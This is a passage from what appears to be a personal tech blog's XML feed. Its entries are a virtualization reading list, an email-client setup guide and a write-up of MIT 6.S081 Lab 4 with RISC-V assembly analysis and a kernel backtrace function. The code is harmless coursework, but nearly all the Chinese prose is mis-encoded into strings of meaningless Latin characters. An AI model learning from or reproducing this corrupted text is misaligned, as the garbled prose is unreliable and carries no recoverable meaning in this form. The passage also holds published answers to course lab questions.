è®ºå…·ä½“æ˜¯ä»€ä¹ˆç±»å‹çš„CPUã€‚è¿™ä¸ªå‡½æ•°é€šå¸¸è®¾ç½®ä¸€äº›é€šç”¨çš„åˆå§‹å€¼ï¼Œç”¨äºåœ¨CPUå¯¹è±¡åˆ›å»ºæ—¶è¿›è¡Œåˆå§‹åŒ–ã€‚ç”±äºä¸åŒCPUç±»å‹å¯èƒ½æœ‰ä¸åŒçš„ç‰¹æ€§å’Œéœ€æ±‚ï¼Œè¿™ä¸ªå‡½æ•°é€šå¸¸åªæ¶‰åŠé€šç”¨çš„åˆå§‹è®¾ç½®ã€‚</p><p><strong>x86_cpu_initfnå‡½æ•°ï¼š</strong> è¿™ä¸ªå‡½æ•°æ˜¯åœ¨å…·ä½“çš„x86 CPUç±»å‹ï¼ˆTYPE_X86_CPUï¼‰çš„åˆå§‹åŒ–å‡½æ•°ã€‚æ¯æ¬¡åˆ›å»ºx86 CPUå¯¹è±¡æ—¶éƒ½ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œå®ƒçš„ä¸»è¦ä½œç”¨æ˜¯ä¸ºç‰¹å®šçš„x86æ¶æ„CPUå¯¹è±¡åˆ›å»ºå„ç§å±æ€§å’Œæ•°æ®ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ä¸€ä¸ªç®€çŸ­çš„è™šæ‹ŸåŒ–å­¦ä¹ è·¯çº¿</title>
    <link href="/p/b3b5f6b7/"/>
    <url>/p/b3b5f6b7/</url>
    
    <content type="html"><![CDATA[<p><img src="https://img.gls.show/img/20230810220435.png"></p><h1 id="ä¹¦ç±"><a href="#ä¹¦ç±" class="headerlink" title="ä¹¦ç±"></a>ä¹¦ç±</h1><ul><li>Hardware and Software Support for Virtualization</li><li>ã€Šæ·±åº¦æ¢ç´¢Linuxç³»ç»Ÿè™šæ‹ŸåŒ–ã€‹</li><li>ã€Šqemu kvmæºç è§£æä¸åº”ç”¨ã€‹</li><li>ã€Škvmå®æˆ˜ã€‹</li></ul><h1 id="Githubä»“åº“"><a href="#Githubä»“åº“" class="headerlink" title="Githubä»“åº“"></a>Githubä»“åº“</h1><ul><li><a href="https://github.com/petehouston/awesome-os-dev">GitHub - petehouston/awesome-os-dev: The collection of useful resources for OS development</a></li><li><a href="https://github.com/Metarget/awesome-cloud-native-security">GitHub - Metarget/awesome-cloud-native-security: awesome resources about cloud native security ğŸ¿</a></li><li><a href="https://github.com/Wenzel/awesome-virtualization">GitHub - Wenzel/awesome-virtualization: Collection of resources about Virtualization</a></li><li><a href="https://github.com/yifengyou/learn-kvm">GitHub - yifengyou/learn-kvm: Qemu KVM(Kernel Virtual Machine)å­¦ä¹ ç¬”è®°</a></li><li><a href="https://github.com/0voice/Introduce_to_virtualization">GitHub - 0voice/Introduce_to_virtualization: 500ç¯‡å…³äºè™šæ‹ŸåŒ–çš„ç»å…¸èµ„æ–™ï¼Œå«CPUè™šæ‹ŸåŒ–ï¼Œç£ç›˜è™šæ‹ŸåŒ–ï¼Œå†…å­˜è™šæ‹ŸåŒ–ï¼Œioè™šæ‹ŸåŒ–ã€‚</a></li></ul><h1 id="ä¸€äº›åšæ–‡"><a href="#ä¸€äº›åšæ–‡" class="headerlink" title="ä¸€äº›åšæ–‡"></a>ä¸€äº›åšæ–‡</h1><p><a href="https://wiki.osdev.org/Main_Page">Expanded Main Page - OSDev Wiki</a><br><a href="https://www.linux-kvm.org/page/KVM_Forum">KVM Forum - KVM</a><br><a href="https://people.cs.nctu.edu.tw/~chenwj/dokuwiki/doku.php?id=kvm">kvm - éŸ‹ä»»çš„ç¶­åŸºç™¾ç§‘</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ä½¿ç”¨é‚®ç®±å®¢æˆ·ç«¯é…ç½®ä¸­ç§‘é™¢é‚®ç®±</title>
    <link href="/p/b8f95159/"/>
    <url>/p/b8f95159/</url>
    
    <content type="html"><![CDATA[<p><img src="https://img.gls.show/img/20230803194818.png"></p><h1 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h1><p>ç”Ÿæ´»ä¸­æˆ‘ä»¬ç»å¸¸ç¢°åˆ°åå¤åˆ‡æ¢å¤šä¸ªé‚®ç®±æŸ¥çœ‹é‚®ä»¶çš„çª˜å¢ƒï¼Œå› æ­¤é…ç½®å¥½é‚®ç®±å®¢æˆ·ç«¯æ˜¯ååˆ†é‡è¦çš„ã€‚é…ç½®å®Œæˆé‚®ç®±å®¢æˆ·ç«¯ä¹‹åï¼Œåªéœ€è¦æ‰“å¼€é‚®ç®±å®¢æˆ·ç«¯ï¼Œä½ å°±å¯ä»¥ç›´è§‚çš„ç®¡ç†å¤šä¸ªé‚®ç®±ï¼Œæ¯”å¦‚QQé‚®ç®±ã€Gmailã€163é‚®ç®±ç­‰</p><p>å¸¸è§çš„é‚®ç®±å®¢æˆ·ç«¯æœ‰ä¸‹é¢å‡ ä¸ªï¼š</p><ul><li>thunderbirdã€‚å¼€æºã€å…è´¹ã€æ’ä»¶ä¸°å¯Œï¼Œå¯æƒœåœ¨æˆ‘çš„æœºå™¨ä¸Šæ°¸è¿œéƒ½ä¼šå‡ºç°å¡æ­»çš„bug</li><li>Outlookã€‚å¾®è½¯å¼€å‘ï¼Œè¢«åŒ…å«åœ¨officeä¸­ï¼Œå…¼å®¹æ€§å¥½ï¼ŒåŠŸèƒ½ä¸°å¯Œï¼Œå¯æƒœofficeæ”¶è´¹å¹¶ä¸”ç»å¸¸è·³å¼¹çª—</li><li><strong>Foxmailã€‚ç®€å•ã€æ˜“ç”¨ï¼Œå®ƒä¹Ÿæ˜¯æˆ‘ç›®å‰çš„ä½¿ç”¨æ–¹æ¡ˆ</strong></li><li><strong>è‹¹æœè‡ªå¸¦é‚®ç®±ã€‚ç®€æ´æ˜“ç”¨ï¼Œæœ‰è‹¹æœå¤šè®¾å¤‡åŒæ­¥æ”¯æŒ</strong></li></ul><h1 id="é…ç½®é‚®ç®±å®¢æˆ·ç«¯"><a href="#é…ç½®é‚®ç®±å®¢æˆ·ç«¯" class="headerlink" title="é…ç½®é‚®ç®±å®¢æˆ·ç«¯"></a>é…ç½®é‚®ç®±å®¢æˆ·ç«¯</h1><p>æ‰“å¼€é‚®ç®±å¯¹åº”çš„è´¦æˆ·é¡µé¢ï¼Œé…ç½®å®¢æˆ·ç«¯ä¸“ç”¨å¯†ç ï¼ˆè¿™ä¸ªå¯†ç ä¸åŒäºä½ çš„ç™»å½•å¯†ç ï¼‰ï¼Œé‚®ç®±å®¢æˆ·ç«¯ä½¿ç”¨çš„æ˜¯è¿™ä¸ªä¸“ç”¨å¯†ç </p><p><img src="https://img.gls.show/img/image-20230713120550237.png" alt="image-20230713120550237"></p><p>åœ¨Foxmailä¸­æ–°å»ºè´¦å·ï¼Œé…ç½®IMAPã€SMTPæœåŠ¡å™¨å’Œå…¶å¯¹åº”çš„ç«¯å£</p><p>ä»¥ä¸­ç§‘é™¢é‚®ç®±ä¸ºä¾‹ï¼Œé…ç½®å¦‚ä¸‹ï¼š</p><p><img src="https://img.gls.show/img/image-20230713120608268.png" alt="image-20230713120608268"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>MIT-6.S081ï¼šLab4 trap</title>
    <link href="/p/69660c86/"/>
    <url>/p/69660c86/</url>
    
    <content type="html"><![CDATA[<p><img src="https://img.gls.show/img/20230830215347.png"></p><h1 id="å‰ç½®å‡†å¤‡"><a href="#å‰ç½®å‡†å¤‡" class="headerlink" title="å‰ç½®å‡†å¤‡"></a>å‰ç½®å‡†å¤‡</h1><ul><li><p>çœ‹å®Œ<a href="https://www.bilibili.com/video/BV19k4y1C7kA">p4ã€p5</a></p></li><li><p>ææ¸…æ¥š<a href="https://pdos.csail.mit.edu/6.S081/2020/labs/traps.html">labè¦æ±‚</a></p></li><li><p>å¯¹riscvæŒ‡ä»¤é›†ã€å‡½æ•°è°ƒç”¨çº¦å®šã€trapæœºåˆ¶æœ‰ä¸€å®šç†è§£</p></li></ul><h1 id="RISC-V-assembly-easy"><a href="#RISC-V-assembly-easy" class="headerlink" title="RISC-V assembly (easy)"></a>RISC-V assembly (<a href="https://pdos.csail.mit.edu/6.S081/2020/labs/guidance.html">easy</a>)</h1><p>é€šè¿‡make fs.img å‘½ä»¤å¯ä»¥å°†user/call.cæ–‡ä»¶è½¬åŒ–ä¸ºuser/call.asmæ–‡ä»¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/param.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">g</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> x+<span class="hljs-number">3</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> g(x);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d\n&quot;</span>, f(<span class="hljs-number">8</span>)+<span class="hljs-number">1</span>, <span class="hljs-number">13</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ä¸éš¾è§‚å¯Ÿå‡ºï¼š</p><ol><li><code>s0</code>å¯„å­˜å™¨ï¼ˆä¹Ÿç§°ä¸º<code>fp</code>æˆ–å¸§æŒ‡é’ˆï¼‰ï¼šå®ƒç”¨äºä¿å­˜å½“å‰å‡½æ•°çš„å¸§æŒ‡é’ˆï¼Œå³æŒ‡å‘å½“å‰å‡½æ•°æ ˆå¸§çš„åŸºå€ã€‚åœ¨å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­ï¼Œ<code>s0</code>å¯„å­˜å™¨é€šå¸¸è¢«ç”¨äºå­˜å‚¨ä¸Šä¸€ä¸ªå‡½æ•°çš„æ ˆå¸§åŸºå€ï¼Œä»¥ä¾¿åœ¨å‡½æ•°è¿”å›æ—¶æ¢å¤è°ƒç”¨è€…çš„æ ˆå¸§ã€‚</li><li><code>sp</code>å¯„å­˜å™¨ï¼ˆä¹Ÿç§°ä¸ºå †æ ˆæŒ‡é’ˆï¼‰ï¼šå®ƒç”¨äºæŒ‡ç¤ºå½“å‰çš„æ ˆé¡¶ä½ç½®ï¼Œå³æ ˆæŒ‡é’ˆã€‚æ ˆæ˜¯ä¸€ç§åè¿›å…ˆå‡ºï¼ˆLIFOï¼‰çš„æ•°æ®ç»“æ„ï¼Œç”¨äºå­˜å‚¨å±€éƒ¨å˜é‡ã€å‡½æ•°è°ƒç”¨ä¿¡æ¯å’Œå…¶ä»–ä¸´æ—¶æ•°æ®ã€‚åœ¨å‡½æ•°è°ƒç”¨æœŸé—´ï¼Œæ ˆä¼šåŠ¨æ€å¢é•¿å’Œæ”¶ç¼©ï¼Œè€Œ<code>sp</code>å¯„å­˜å™¨ä¼šéšç€æ ˆçš„å˜åŒ–è€Œç§»åŠ¨ã€‚</li><li>a0ä¿å­˜ç¬¬ä¸€ä¸ªå‚æ•°ï¼ŒåŒæ—¶å…·æœ‰å­˜å‚¨è¿”å›å€¼çš„ç”¨é€”ï¼ˆä¹Ÿå³æ˜¯xï¼Œè¿”å›x+3ï¼‰ã€‚a1å­˜å‚¨ç¬¬äºŒä¸ªå‚æ•°ï¼Œä»¥æ­¤ç±»æ¨</li><li>få‡½æ•°è¢«å†…è”ä¼˜åŒ–ï¼Œæ²¡æœ‰æ–°å¼€è¾Ÿæ ˆå¸§ï¼Œå®ƒçš„å†…å®¹å’Œgå‡½æ•°ç›¸åŒ</li><li>raå¯„å­˜å™¨å­˜å‚¨å‡½æ•°çš„è¿”å›åœ°å€</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs asm"><br>user/_call:     file format elf64-littleriscv<br><br><br>Disassembly of section .text:<br><br>0000000000000000 &lt;g&gt;:<br>#include &quot;kernel/param.h&quot;<br>#include &quot;kernel/types.h&quot;<br>#include &quot;kernel/stat.h&quot;<br>#include &quot;user/user.h&quot;<br><br>int g(int x) &#123;<br>   0:1141                addisp,sp,-16 #ç»™æ ˆæŒ‡é’ˆåˆ†é…å†…å­˜<br>   2:e422                sds0,8(sp) #ä¿å­˜s0å¯„å­˜å™¨çš„å€¼<br>   4:0800                addis0,sp,16 <br>  return x+3;<br>&#125;<br>   6:250d                addiwa0,a0,3 # a0æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå³æ˜¯xï¼Œè¿”å›x+3<br>   8:6422                lds0,8(sp)<br>   a:0141                addisp,sp,16<br>   c:8082                ret<br><br>000000000000000e &lt;f&gt;:<br>#få‡½æ•°è¢«å†…è”ä¼˜åŒ–ï¼Œæ²¡æœ‰æ–°å¼€è¾Ÿæ ˆå¸§ï¼Œå®ƒçš„å†…å®¹å’Œgå‡½æ•°ç›¸åŒ<br>int f(int x) &#123;<br>   e:1141                addisp,sp,-16<br>  10:e422                sds0,8(sp)<br>  12:0800                addis0,sp,16<br>  return g(x);<br>&#125;<br>  14:250d                addiwa0,a0,3<br>  16:6422                lds0,8(sp)<br>  18:0141                addisp,sp,16<br>  1a:8082                ret<br><br>000000000000001c &lt;main&gt;:<br><br>void main(void) &#123;<br>  1c:1141                addisp,sp,-16 # åˆå§‹åŒ–å·¥ä½œ<br>  1e:e406                sdra,8(sp)<br>  20:e022                sds0,0(sp)<br>  22:0800                addis0,sp,16<br>  printf(&quot;%d %d\n&quot;, f(8)+1, 13);<br>  24:4635                lia2,13<br>  26:45b1                lia1,12 # f(8)+1<br>  28:00000517          auipca0,0x0<br>  2c:79050513          addia0,a0,1936 # 7b8 &lt;malloc+0xea&gt;<br>  30:00000097          auipcra,0x0<br>  34:5e6080e7          jalr1510(ra) # 616 &lt;printf&gt;<br>  exit(0);<br>  38:4501                lia0,0<br>  3a:00000097          auipcra,0x0<br>  3e:274080e7          jalr628(ra) # 2ae &lt;exit&gt;<br><br></code></pre></td></tr></table></figure><h2 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h2><p>Which registers contain arguments to functions? For example, which register holds 13 in mainâ€™s call to <code>printf</code>?</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">reg    |<span class="hljs-string"> name  </span>|<span class="hljs-string"> saver  </span>|<span class="hljs-string"> description</span><br><span class="hljs-string">-------+-------+--------+------------</span><br><span class="hljs-string">x0     </span>|<span class="hljs-string"> zero  </span>|<span class="hljs-string">        </span>|<span class="hljs-string"> hardwired zero</span><br><span class="hljs-string">x1     </span>|<span class="hljs-string"> ra    </span>|<span class="hljs-string"> caller </span>|<span class="hljs-string"> return address</span><br><span class="hljs-string">x2     </span>|<span class="hljs-string"> sp    </span>|<span class="hljs-string"> callee </span>|<span class="hljs-string"> stack pointer</span><br><span class="hljs-string">x3     </span>|<span class="hljs-string"> gp    </span>|<span class="hljs-string">        </span>|<span class="hljs-string"> global pointer</span><br><span class="hljs-string">x4     </span>|<span class="hljs-string"> tp    </span>|<span class="hljs-string">        </span>|<span class="hljs-string"> thread pointer</span><br><span class="hljs-string">x5-7   </span>|<span class="hljs-string"> t0-2  </span>|<span class="hljs-string"> caller </span>|<span class="hljs-string"> temporary registers</span><br><span class="hljs-string">x8     </span>|<span class="hljs-string"> s0/fp </span>|<span class="hljs-string"> callee </span>|<span class="hljs-string"> saved register / frame pointer</span><br><span class="hljs-string">x9     </span>|<span class="hljs-string"> s1    </span>|<span class="hljs-string"> callee </span>|<span class="hljs-string"> saved register</span><br><span class="hljs-string">x10-11 </span>|<span class="hljs-string"> a0-1  </span>|<span class="hljs-string"> caller </span>|<span class="hljs-string"> function arguments / return values</span><br><span class="hljs-string">x12-17 </span>|<span class="hljs-string"> a2-7  </span>|<span class="hljs-string"> caller </span>|<span class="hljs-string"> function arguments</span><br><span class="hljs-string">x18-27 </span>|<span class="hljs-string"> s2-11 </span>|<span class="hljs-string"> callee </span>|<span class="hljs-string"> saved registers</span><br><span class="hljs-string">x28-31 </span>|<span class="hljs-string"> t3-6  </span>|<span class="hljs-string"> caller </span>|<span class="hljs-string"> temporary registers</span><br><span class="hljs-string">pc     </span>|<span class="hljs-string">       </span>|<span class="hljs-string">        </span>|<span class="hljs-string"> program counter</span><br></code></pre></td></tr></table></figure><p>a0ä¿å­˜ç¬¬ä¸€ä¸ªå‚æ•°ï¼ŒåŒæ—¶å…·æœ‰å­˜å‚¨è¿”å›å€¼çš„ç”¨é€”ï¼ˆä¹Ÿå³æ˜¯xï¼Œè¿”å›x+3ï¼‰ã€‚a1å­˜å‚¨ç¬¬äºŒä¸ªå‚æ•°ï¼Œä»¥æ­¤ç±»æ¨</p><h2 id="Q2"><a href="#Q2" class="headerlink" title="Q2"></a>Q2</h2><p>Where is the call to function <code>f</code> in the assembly code for main? Where is the call to <code>g</code>? (Hint: the compiler may inline functions.)</p><p>ä»£ç <code>li    a1,12 </code>ç›´æ¥å°†f(8)+1çš„ç»“æœå­˜å…¥a1ä¸­ï¼Œå¹¶æ²¡æœ‰è°ƒç”¨å‡½æ•°çš„è¿‡ç¨‹ï¼Œè¿™é‡Œå­˜åœ¨ç¼–è¯‘å™¨çš„ä¼˜åŒ–</p><h2 id="Q3"><a href="#Q3" class="headerlink" title="Q3"></a>Q3</h2><p>At what address is the function <code>printf</code> located?</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">0000000000000616</span> &lt;printf&gt;:<br><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *fmt, ...)</span></span><br><span class="hljs-function"></span>&#123;<br> <span class="hljs-number">616</span>:<span class="hljs-number">711</span>d                addisp,sp,<span class="hljs-number">-96</span><br></code></pre></td></tr></table></figure><p>616</p><blockquote><p><code>jalr 1510(ra)</code>æŒ‡ä»¤ç”¨äºè°ƒç”¨<code>printf</code>å‡½æ•°ï¼Œå…¶ä¸­åç§»é‡1510æ˜¯ç›¸å¯¹äºå…¨å±€åœ°å€0x0<strong>çš„åç§»</strong>ã€‚ï¼ˆå…¨å±€åœ°å€ä¸ç¡®å®šï¼‰</p></blockquote><h2 id="Q4"><a href="#Q4" class="headerlink" title="Q4"></a>Q4</h2><p>Run the following code.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">unsigned</span> int i = <span class="hljs-number">0</span>x<span class="hljs-number">00646</span>c<span class="hljs-number">72</span>;<br><span class="hljs-attribute">printf</span>(<span class="hljs-string">&quot;H%x Wo%s&quot;</span>, <span class="hljs-number">57616</span>, &amp;i);<br>    <br></code></pre></td></tr></table></figure><p>What is the output? <a href="http://web.cs.mun.ca/~michael/c/ascii-table.html">Hereâ€™s an ASCII table</a> that maps bytes to characters.</p><p>The output depends on that fact that the RISC-V is little-endian. If the RISC-V were instead big-endian what would you set <code>i</code> to in order to yield the same output? Would you need to change <code>57616</code> to a different value?</p><p><a href="http://www.webopedia.com/TERM/b/big_endian.html">Hereâ€™s a description of little- and big-endian</a> and <a href="http://www.networksorcery.com/enp/ien/ien137.txt">a more whimsical description</a>.</p><p>57616æ˜¯0xE110</p><p>%sæ‰“å°å‡º&amp;iæŒ‡å‘åå…­è¿›åˆ¶æ•°å¯¹åº”çš„ASCIIç ï¼Œé‡0åœæ­¢æ‰“å°ã€‚å˜é‡<code>i</code>å­˜å‚¨äº†å­—ç¬¦ä¸²â€rld\0â€</p><p>æœ€ç»ˆæ‰“å°å‡ºHE110 World</p><h2 id="Q5"><a href="#Q5" class="headerlink" title="Q5"></a>Q5</h2><p>In the following code, what is going to be printed after <code>&#39;y=&#39;</code>? (note: the answer is not a specific value.) Why does this happen?</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">printf</span>(<span class="hljs-string">&quot;x=%d y=%d&quot;</span>, <span class="hljs-number">3</span>);<br></code></pre></td></tr></table></figure><p>y=a2å¯„å­˜å™¨çš„å€¼</p><p>è¿™é‡Œprintfå‡½æ•°ç›¸å½“äºæœ‰ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯å­—ç¬¦ä¸²ï¼ˆa0ä¿å­˜ï¼‰ï¼Œç¬¬äºŒä¸ªæ˜¯3ï¼ˆa1ä¿å­˜ï¼‰ï¼Œç¬¬ä¸‰ä¸ªï¼ˆï¼ˆa2ä¿å­˜ï¼‰ï¼‰</p><h1 id="Backtrace-moderate"><a href="#Backtrace-moderate" class="headerlink" title="Backtrace (moderate)"></a>Backtrace (<a href="https://pdos.csail.mit.edu/6.S081/2020/labs/guidance.html">moderate</a>)</h1><p>è¦æ±‚ï¼š<strong>åœ¨ kernel/printf.c ä¸­å®ç°ä¸€ä¸ª backtrace ()å‡½æ•°ã€‚åœ¨ sys _ sleep ä¸­æ’å…¥å¯¹æ­¤å‡½æ•°çš„è°ƒç”¨ï¼Œç„¶åè¿è¡Œ bttestï¼Œå®ƒè°ƒç”¨ sys _ sleepã€‚ä½ çš„è¾“å‡ºåº”è¯¥å¦‚ä¸‹:</strong></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">backtrace:</span><br><span class="hljs-number">0x000000080002cda</span><br><span class="hljs-number">0x000000080002bb6</span><br><span class="hljs-number">0x0000000080002898</span><br></code></pre></td></tr></table></figure><p>ç¼–è¯‘å™¨åœ¨æ¯ä¸ªå †æ ˆå¸§ä¸­æ”¾å…¥ä¸€ä¸ªåŒ…å«è°ƒç”¨è€…å¸§æŒ‡é’ˆåœ°å€çš„å¸§æŒ‡é’ˆã€‚æ‚¨çš„å›æº¯åº”è¯¥ä½¿ç”¨è¿™äº›å¸§æŒ‡é’ˆæ¥éå†å †æ ˆï¼Œå¹¶åœ¨æ¯ä¸ªå †æ ˆå¸§ä¸­æ‰“å°ä¿å­˜çš„è¿”å›åœ°å€ã€‚</p><blockquote><p>è¡¥å……ä¸€ä¸‹åŸºç¡€çŸ¥è¯†ï¼š</p><p>æ ˆæŒ‡é’ˆï¼šspï¼ˆstack pointerï¼‰ï¼ŒæŒ‡å‘æ ˆçš„ä½åœ°å€</p><p>å¸§æŒ‡é’ˆï¼šfpï¼ˆframe pointerï¼‰ï¼ŒæŒ‡å‘æ ˆçš„é«˜åœ°å€</p><p>fp-8ï¼šè¿”å›åœ°å€</p><p>fp-16ï¼špreview fp</p><p>å†…æ ¸ä¼šä¸ºæ ˆåˆ†é…ä¸€é¡µçš„å†…å­˜ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ PGROUNDUPï¼ˆfpï¼‰å’Œ PGROUNDDOWNï¼ˆfpï¼‰å®šä½æ ˆçš„ä¸Šä¸‹è¾¹ç•Œï¼Œä»¥ç»ˆæ­¢å¾ªç¯</p></blockquote><p>å…·ä½“çš„æ ˆçš„å†…å­˜å¸ƒå±€å‚è€ƒlectureä¸­æ•™æˆæ‰‹ç”»å›¾</p><ul><li><p>å°†backtraceçš„åŸå‹æ·»åŠ åˆ° kernel/defs.hï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ sys _ sleep ä¸­è°ƒç”¨backtrace</p><ul><li>åœ¨defs.hä¸­æ·»åŠ <code>void backtrace(void);</code></li></ul></li><li><p>GCC ç¼–è¯‘å™¨å°†å½“å‰æ­£åœ¨æ‰§è¡Œçš„å‡½æ•°çš„å¸§æŒ‡é’ˆå­˜å‚¨åœ¨å¯„å­˜å™¨ s0ä¸­ã€‚å‘ kernel/riscv.h æ·»åŠ ä»¥ä¸‹å‡½æ•°ï¼Œå¹¶åœ¨backtraceä¸­è°ƒç”¨è¿™ä¸ªå‡½æ•°æ¥è¯»å–å½“å‰å¸§æŒ‡é’ˆã€‚è¿™ä¸ªå‡½æ•°ä½¿ç”¨å†…è”æ¥è¯»å– s0ï¼š</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asm">static inline uint64<br>r_fp()<br>&#123;<br>  uint64 x;<br>  asm volatile(&quot;mv %0, s0&quot; : &quot;=r&quot; (x) );<br>  return x;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨printf.cæ–‡ä»¶ä¸­æ·»åŠ å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backtrace</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  uint64 fp=r_fp();<span class="hljs-comment">//get fp </span><br>  uint64 up_addr=PGROUNDUP(fp);<span class="hljs-comment">//up bound</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;backtrace:\n&quot;</span>);<span class="hljs-comment">//fmt output </span><br>  <span class="hljs-keyword">while</span>(fp&lt;up_addr)<br>  &#123;<br>    uint64 ret_addr=*(uint64 *)(fp<span class="hljs-number">-8</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,ret_addr);<span class="hljs-comment">// attention that after %p is \n</span><br>    fp=*(uint64 *)(fp<span class="hljs-number">-16</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>bttest.cä¸­å¦‚æ˜¯å†™ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span 